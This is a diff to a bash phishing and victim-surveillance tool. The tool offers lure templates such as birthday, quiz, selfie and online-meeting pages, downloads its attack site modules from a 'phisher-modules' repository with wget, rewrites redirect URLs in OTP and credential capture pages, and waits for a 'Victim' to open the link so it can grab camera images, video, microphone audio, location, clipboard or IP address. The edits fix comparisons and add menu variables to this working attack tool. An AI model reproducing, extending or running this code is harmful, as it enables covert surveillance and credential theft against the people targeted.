@@ -666,6 +666,7 @@ echo -e " "
 read -p "${prompt}" reply_camera
 case $reply_camera in
         1 )
+		site_access="image"
                 site_id="default"
                 dgfname="default"
                 rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
@@ -673,6 +674,7 @@ case $reply_camera in
                 capture_type="IMG"
                 site_template="Default" ;;
         2 )
+		site_access="image"
                 site_id="birthday"
                 dgfname="birthday"
                 rdurl="www.homemade-gifts-made-easy.com/image-files/happy-birthday-images-many-blessings-600x900.jpg"
@@ -680,6 +682,7 @@ case $reply_camera in
                 capture_type="IMG"
                 site_template="Birthday" ;;
         3 )
+		site_access="image"
                 site_id="book"
                 dgfname="book"
                 rdurl="www.amazon.in/Think-Grow-Rich-Napoleon-Hill/dp/8194790883"
@@ -687,6 +690,7 @@ case $reply_camera in
                 capture_type="IMG"
                 site_template="Book" ;;
         4 )
+		site_access="image"
                 site_id="boxwish"
                 dgfname="boxwish"
                 rdurl="www.google.com"
@@ -694,6 +698,7 @@ case $reply_camera in
                 capture_type="IMG"
                 site_template="Box Wish" ;;
         5 )
+		site_access="image"
                 site_id="firework"
                 dgfname="firework"
                 rdurl="www.fireworks.com"
@@ -701,6 +706,7 @@ case $reply_camera in
                 capture_type="IMG"
                 site_template="Firework" ;;
         6 )
+		site_access="image"
                 site_id="game"
                 dgfname="game"
                 rdurl="www.chess.com"
@@ -708,6 +714,7 @@ case $reply_camera in
                 capture_type="IMG"
                 site_template="Game" ;;
         7 )
+		site_access="image"
                 site_id="guess"
                 dgfname="guess"
                 rdurl="www.guess.com"
@@ -715,6 +722,7 @@ case $reply_camera in
                 capture_type="IMG"
                 site_template="Guess" ;;
 	8 )
+		site_access="image"
                 site_id="quiz"
                 dgfname="quiz"
                 rdurl="www.quiz.com"
@@ -722,6 +730,7 @@ case $reply_camera in
                 capture_type="IMG"
                 site_template="Quiz" ;;
         9 )
+		site_access="image"
                 site_id="rps"
                 dgfname="rps"
                 rdurl="www.google.com"
@@ -729,6 +738,7 @@ case $reply_camera in
                 capture_type="IMG"
                 site_template="RPS" ;;
         10 )
+		site_access="image"
                 site_id="selfie"
                 dgfname="selfie"
                 rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
@@ -736,6 +746,7 @@ case $reply_camera in
                 capture_type="IMG"
                 site_template="Selfie" ;;
         11 )
+		site_access="image"
                 site_id="spinwheel"
                 dgfname="spinwheel"
                 rdurl="www.luckydraw.live"
@@ -743,6 +754,7 @@ case $reply_camera in
                 capture_type="IMG"
                 site_template="Spin Wheel" ;;
         A | a )
+		site_access="video"
                 site_id="filter"
                 dgfname="filter"
                 rdurl="www.snapchat.com"
@@ -750,6 +762,7 @@ case $reply_camera in
                 capture_type="VID"
                 site_template="Filter" ;;
         B | b )
+		site_access="video"
                 site_id="onlinemeet"
                 dgfname="onlinemeet"
                 rdurl="www.zoom.us"
@@ -758,11 +771,10 @@ case $reply_camera in
                 site_template="Online Meet" ;;
 	0 | 00 | x | X | exit)
 		msg_exit;;
-        
 	*)
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                  { sleep 1; clear; menu_camera; };;
-esac    
+esac
 }
 menu_microphone(){
 status_display
@@ -917,11 +929,11 @@ case $reply_ip in
                 site_template="Default" ;;
 	0 | 00 | x | X | exit)
 		msg_exit;;
-        
+	
 	*)
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                  { sleep 1; clear; menu_ip; };;
-esac    
+esac
 }
 
 
@@ -931,7 +943,6 @@ dsites(){
         status
         if [[ ! -d "${sites_dir}" ]]; then
                 if [ $plainnetstats == "online" ]; then
-                        rm -rf ${sites_dir}
                         echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloading Sites..."
                         wget --no-check-certificate https://github.com/Alygnt/phisher-modules/archive/refs/heads/sites.zip > /dev/null 2>&1
                         sleep 1
@@ -955,8 +966,10 @@ dsites(){
                         homepage
                 fi
         else
+		echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Deleting sites..."
                 rm -rf ${sites_dir}
                 echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BOLDGREEN} SITES ARE DELETED SUCCESSFULLY... ${NA}"
+		homepage
         fi
 }
 
@@ -1580,28 +1593,28 @@ redirect_setup() {
         if [ -z "$urdurl" ]; then
                rdurl=${urdurl}
         fi 
-	if [[ ${capture_type}="NOTP" ]];then
+	if [[ "${capture_type}" == "NOTP" ]];then
                 awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/process.php"
-        elif [[ ${capture_type}="POTP" ]];then
+        elif [[ "${capture_type}" == "POTP" ]];then
                 awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
-        elif [[ ${capture_type}="OOTP" ]];then
+        elif [[ "${capture_type}" == "OOTP" ]];then
                 awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
-        elif [[ ${capture_type}="IMG" ]];then
+        elif [[ "${capture_type}" == "IMG" ]];then
                 echo " NOT READ YET"; sleep 3
         ##        awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
-        elif [[ ${capture_type}="VID" ]];then
+        elif [[ "${capture_type}" == "VID" ]];then
                 echo " NOT READ YET"; sleep 3
         ##        awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
-        elif [[ ${capture_type}="MIC" ]];then
+        elif [[ "${capture_type}" == "MIC" ]];then
                 echo " NOT READ YET"; sleep 3
         ##        awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php"
-        elif [[ ${capture_type}="LOC" ]];then
+        elif [[ "${capture_type}" == "LOC" ]];then
                 awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/index.php"
-        elif [[ ${capture_type}="CLIP" ]];then
+        elif [[ "${capture_type}" == "CLIP" ]];then
                 awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/index.php"
-        elif [[ ${capture_type}="PAT" ]];then
+        elif [[ "${capture_type}" == "PAT" ]];then
                 awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/post.php"
-        elif [[ ${capture_type}="IP" ]];then
+        elif [[ "${capture_type}" == "IP" ]];then
                 awk -i inplace "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/index.php"
 	else
 		echo -e "${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up custom redirect URL!!"
@@ -1777,25 +1790,25 @@ capture_data_check(){
         echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Victim to open the link, ${MAGENTA}Ctrl + C ${YELLOW}to exit..."
         mkdir ${final_log_dir}
         touch ${final_log_name}
-	if [ ${capture_type}="NOTP" ];then
+	if [ "${capture_type}" == "NOTP" ];then
                 capture_data_notp
-        elif [ ${capture_type}="OOTP" ];then
+        elif [ "${capture_type}" == "OOTP" ];then
                 capture_data_ootp
-        elif [ ${capture_type}="POTP" ];then
+        elif [ "${capture_type}" == "POTP" ];then
                 capture_data_potp
-        elif [ ${capture_type}="IMG" ];then
+        elif [ "${capture_type}" == "IMG" ];then
                 capture_img
-        elif [ ${capture_type}="VID" ];then
+        elif [ "${capture_type}" == "VID" ];then
                 capture_vid
-        elif [ ${capture_type}="MIC" ];then
+        elif [ "${capture_type}" == "MIC" ];then
                 capture_mic
-        elif [ ${capture_type}="LOC" ];then
+        elif [ "${capture_type}" == "LOC" ];then
                 capture_loc
-        elif [ ${capture_type}="CLIP" ];then
+        elif [ "${capture_type}" == "CLIP" ];then
                 capture_clip
-        elif [ ${capture_type}="PAT" ];then
+        elif [ "${capture_type}" == "PAT" ];then
                 capture_pat
-        elif [ ${capture_type}="IP" ];then
+        elif [ "${capture_type}" == "IP" ];then
                 capture_ip
 	else
 		echo -e " Error Occured in capturing data!!"
